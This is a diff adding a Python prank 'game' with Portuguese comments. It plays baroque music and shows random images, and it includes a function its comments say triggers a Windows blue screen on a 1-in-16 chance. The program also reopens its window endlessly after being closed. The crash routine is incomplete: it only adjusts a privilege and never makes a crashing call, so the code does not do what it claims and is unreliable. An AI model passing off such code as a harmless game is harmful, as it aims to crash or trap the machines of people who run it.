@@ -1,0 +1,84 @@
+# conjuntos de funções não padrões que eu importei
+from PIL import Image
+import asyncio
+import socket
+import pygame
+import ctypes
+import random
+import os
+
+
+# inicia o pygame e o mixer para musicas
+pygame.mixer.init()
+pygame.init()
+
+
+# quando compilado com pyinstaller é necessário o uso desse código
+# pois os arquivos não serão acessados normalmente mas sim em uma
+# pasta temporária
+barroco_path = f"{os.path.abspath(os.path.dirname(__file__))}\\barroco"
+
+
+# escolhe o nome da janela do jogo
+pygame.display.set_caption(f'Seja bem vindo(a) "{socket.gethostname()}" ao Jogo da sorte barroca')
+pygame.display.set_icon(pygame.image.load(f"{barroco_path}\\images\\barroco12.png"))
+
+
+async def playsound_barroco(audio_volume: int):
+    # carrega o audio barroco.mp3 e salva o valor do volume
+    pygame.mixer.music.load(os.path.abspath(os.path.join(barroco_path, 'barroco.mp3')))
+    pygame.mixer.music.set_volume(audio_volume)
+
+    # usa o mixer para tocar o arquivo de audio barroco.mp3 dessincronizadamente
+    pygame.mixer.music.play()
+
+
+async def trigger_bsod(debug=False):
+    if debug:
+        # por razões de sanidade mental se eu quiser posso ao invés de tomar
+        # uma tela azul, só mostrar que eu na teoria tomaria, e salvar tempo
+        print("[+] BSOD Triggered")
+    else:
+        # código que gera uma tela azul
+        ntdll = ctypes.windll.ntdll
+        prev_value = ctypes.c_bool()
+        ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
+
+
+async def main():
+    # chance de 1/16 de tomar tela azul
+    if random.choice(range(16)) == 0:
+        # "await trigger_bsod(True)" caso queira receber
+        # mensagem no console ao invés de crashar
+        await trigger_bsod()
+
+    # escolhe aleatóriamente uma imagem dentro da pasta barroco\images
+    # que foi compilada, salva em uma variável e também salva o path para
+    # chegar na imagem aleatória
+    images_path = f'{barroco_path}\\images'
+    random_image = random.choice(os.listdir(images_path))
+    rand_image_path = f'{images_path}\\{random_image}'
+
+    # pega o tamanho da imagem da variavel image_path e salva o tamanho da janela pro mesmo tamanho
+    w, h = Image.open(rand_image_path).size
+    screen = pygame.display.set_mode([w, h])
+
+    # carrega a imagem da variavel image_path, apresenta ela nas coordenadas 0 0 da janela e atualiza
+    screen.blit(pygame.image.load(rand_image_path), (0, 0))
+    pygame.display.update()
+
+    while True:
+        # while True continua procurando por eventos
+        for event in pygame.event.get():
+            # se o evento for de tipo QUIT ele finaliza a chamada da função
+            if event.type == pygame.QUIT:
+                return
+
+
+if __name__ == "__main__":
+    # faz a chamada da função uma vez
+    asyncio.run(playsound_barroco(1))
+
+    # faz a chamada da função infinitamente
+    while True:
+        asyncio.run(main())
